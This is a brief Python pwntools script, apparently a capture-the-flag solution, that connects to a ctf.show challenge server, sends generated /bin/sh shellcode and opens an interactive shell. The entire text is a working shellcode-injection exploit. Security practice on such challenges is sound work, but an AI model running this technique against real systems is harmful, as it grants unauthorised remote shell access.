







```python
from pwn import *
context(os = 'Linux', arch = 'amd64', log_level = 'debug')
p = remote('pwn.challenge.ctf.show', 28281)
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

